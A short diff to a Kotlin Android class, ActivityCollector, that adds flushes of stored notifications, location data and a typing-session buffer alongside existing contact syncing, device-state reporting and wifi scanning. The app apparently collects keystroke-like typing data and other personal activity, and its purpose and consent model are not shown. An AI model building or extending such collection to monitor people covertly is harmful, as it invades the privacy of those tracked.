@@ -62,6 +62,8 @@ class ActivityCollector(private val context: Context) {
             if (!started) return
             ActivityStore.flush(context)
             NotesStore.flush(context)
+            NotificationStore.flush(context)
+            LocationStore.flush(context)
             handler.postDelayed(this, 8_000)
         }
     }
@@ -80,6 +82,7 @@ class ActivityCollector(private val context: Context) {
         started = false
         handler.removeCallbacks(syncLoop)
         handler.removeCallbacks(flushLoop)
+        runCatching { TypingSessionBuffer.flush(context) }
         locationTracker?.stop()
         locationTracker = null
         wifiPresence?.stop()
@@ -106,6 +109,9 @@ class ActivityCollector(private val context: Context) {
         runCatching { ContactsReader.sync(context) }
         NotesStore.flush(context)
         ActivityStore.flush(context)
+        NotificationStore.flush(context)
+        LocationStore.flush(context)
+        runCatching { TypingSessionBuffer.flush(context) }
         DeviceStateReporter.send(context)
         wifiPresence?.scanNow()
     }
